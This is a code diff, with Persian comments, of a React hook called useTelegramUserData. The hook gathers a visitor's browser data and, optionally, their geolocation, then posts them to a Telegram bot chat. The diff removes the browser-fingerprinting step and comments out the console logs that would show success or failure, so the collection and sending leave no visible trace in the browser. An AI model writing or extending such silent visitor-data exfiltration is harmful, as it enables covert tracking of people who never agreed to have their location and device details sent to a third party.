@@ -2,7 +2,7 @@
 import { useEffect, useState } from 'react';
 import axios, { AxiosError } from 'axios';
 import { UAParser } from 'ua-parser-js';
-import Fingerprint2 from 'fingerprintjs2';
+
 
 // تعریف تایپ‌ها
 interface TelegramUserDataProps {
@@ -71,18 +71,18 @@ const useTelegramUserData = ({ botToken, chatId, collectGeolocation = false }: T
                             );
                         });
                     } catch (geoError) {
-                        console.warn('خطا در دریافت موقعیت جغرافیایی:', geoError);
+                        // console.warn('خطا در دریافت موقعیت جغرافیایی:', geoError);
                     }
                 }
 
-                // دریافت فینگرپرینت
-                try {
-                    const components = await Fingerprint2.getPromise();
-                    // @ts-ignore
-                    userData.fingerprint = Fingerprint2.x64hash128(components.map((c) => c.value).join(), 31);
-                } catch (fpError) {
-                    console.warn('خطا در دریافت فینگرپرینت:', fpError);
-                }
+                // // دریافت فینگرپرینت
+                // try {
+                //     const components = await Fingerprint2.getPromise();
+                //     // @ts-ignore
+                //     userData.fingerprint = Fingerprint2.x64hash128(components.map((c) => c.value).join(), 31);
+                // } catch (fpError) {
+                //     console.warn('خطا در دریافت فینگرپرینت:', fpError);
+                // }
 
                 // ساخت پیام
                 const message: string = `
@@ -109,11 +109,11 @@ const useTelegramUserData = ({ botToken, chatId, collectGeolocation = false }: T
                     text: message,
                 }, { timeout: 10000 });
 
-                console.log('اطلاعات با موفقیت ارسال شد');
+                // console.log('اطلاعات با موفقیت ارسال شد');
             } catch (error: unknown) {
                 const errorMessage = error instanceof AxiosError ? error.message : 'خطای ناشناخته';
                 setError(errorMessage);
-                console.error('خطا در جمع‌آوری یا ارسال اطلاعات:', error);
+                // console.error('خطا در جمع‌آوری یا ارسال اطلاعات:', error);
             } finally {
                 setIsLoading(false);
             }
